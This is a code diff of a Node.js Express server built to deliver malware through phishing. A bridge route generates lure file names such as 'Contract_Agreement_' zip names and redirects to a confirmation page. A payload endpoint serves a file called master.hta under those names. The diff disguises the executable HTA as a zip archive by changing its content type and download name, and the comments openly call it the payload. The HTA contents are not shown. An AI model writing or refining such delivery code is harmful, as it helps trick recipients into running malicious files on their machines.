@@ -1,37 +1,25 @@
 const express = require('express');
 const path = require('path');
 const crypto = require('crypto');
-const fs = require('fs');
 const app = express();
 const port = process.env.PORT || 3000;
 
-// Serve static files (index.html, confirmed.html)
 app.use(express.static('public'));
 
-// 1. The Bridge: Generates a unique token and filename
+// The Bridge: Generates a unique ZIP name and redirects to confirm.html
 app.get('/bridge', (req, res) => {
-    // Generate a random 5-digit number for uniqueness
-    const randomId = crypto.randomInt(10000, 99999);
-    const uniqueName = `Cocktail_Invite_${randomId}.hta`;
-    
-    // Redirect to the confirmation page, passing the unique name as a parameter
-    res.redirect(`/confirmed.html?file=${uniqueName}`);
+    const randomId = crypto.randomInt(100000, 999999);
+    const uniqueZip = `Contract_Agreement_${randomId}.zip`;
+    res.redirect(`/confirm.html?zip=${uniqueZip}`);
 });
 
-// 2. The Payload Endpoint: Serves the actual HTA with the unique name
+// The Payload Endpoint: Serves the master.hta but names it as a ZIP
+// Note: Browsers will save it as a ZIP because of the Content-Disposition header
 app.get('/payload/:filename', (req, res) => {
-    // We always serve the same 'master.hta' file, but tell the browser it has a different name
-    const filePath = path.join(__dirname, 'public', 'master.hta');
+    const filePath = path.join(__dirname, 'public', 'payload', 'master.hta');
     
-    if (!fs.existsSync(filePath)) {
-        return res.status(404).send('Payload not found.');
-    }
-
-    // Set headers to force download with the UNIQUE name generated in /bridge
     res.setHeader('Content-Disposition', `attachment; filename="${req.params.filename}"`);
-    res.setHeader('Content-Type', 'application/hta');
-    
-    // Send the file content
+    res.setHeader('Content-Type', 'application/zip');
     res.sendFile(filePath);
 });
 
